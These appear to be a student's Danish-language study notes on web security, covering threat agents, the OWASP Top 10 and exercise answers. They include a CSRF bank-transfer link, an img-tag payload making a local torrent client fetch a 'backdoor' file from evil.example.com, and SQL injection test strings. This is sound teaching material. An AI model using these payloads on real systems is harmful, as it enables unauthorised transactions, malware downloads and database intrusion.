Lecture
=======
-

Under læsning:
==============

Noter
-----
Black box
- Er dyrt at gennemgå alt sourcekode, så ofte bedst at analyser systemer via `black box`
- 


### problem 6.1
- threat agents:
    - Hvem er mulig adversary?
    - opdelt i mange subkategorier
        - non-target specific, så som virus
        - employees der er vrede på virksomheden
        - kriminelle
        - andre virksomheder eller organisationer (NSA?)
        - mennesker ved et uheld
        - mennesker med vilje
        - natural, så som jordskæl, brand, osv.
attack vectors:
    - Er en vej eller måde hvorpå en hacker kan opnå adgang til en computer eller server for at udfører et ondsindet angreb. 
security weakness:
    - hvorfor findes denne sårbarhed og hvordan kan de findes? 
technical impact:
    - Hvad kan udkommet være teknisk set? overtagelse af server?
business impact:
    - Hvad kan udkommet være set fra et business synspunkt? ofte tab af data 

### problem 6.2

1. inject
    - sql injection
2. authentication / session management
    - taking over password, keys, sessions tokens....
3. cross-site-scription (XSS)
    - execute scripts in the users browser.
4. Insecure direct object references
    - A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key. Without an access control check or other protection
5. Security misconfiguration
    - fejl i konfigurering af f.eks. frameworks
6. sensitive data exposure
    - credit card, tax ids, authentication credentials og så videre. encrypt!
7. missing function level access control
    - gem functionalitet i UI'en, men bagved bliver brugeren ikke authenticated.
8. Cross-site request forgery (CSRF)
    - også kendt som session riding
    - f.eks. sender link til brugeren der allerede er logget ind "www.bank.dk/transfer?to=adversary&amount=10000
    - kan også udnytte lokale sårbare endpoints som: img src="localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor .torrent">
9. Using components with known vulnerabilities
    - Outdated libs/frameworks/software
    - Kan være de kører med for høje privileges, som f.eks. forældret antivirus
10. Unvalidated redirects and forwards
    - adversaries kan redirect brugere til malware sites, som f.eks. via en facebook post.
    
### problem 6.3
- Input tags
- form tags
- common frameworks
- http request headers
- api endpoints such as /api/*
    - specielt post.
- hidden fields

### problem 6.7
VirtueMart version 1.1.2 and below is vulnerable to simple SQL injections
- http://www.waraxe.us/content-71.html

### problem 6.11
- prøv disse input: 
    - '--
    - ' or '1'='1
    - vil resultere i sql strings som:
        - 'SELECT * FROM users WHERE username =’-- <some sql>.
        - 'SELECT * FROM users WHERE username =’’ or ’1’=’1’'.
        
### problem 6.13
- Samme metode som i 6.11

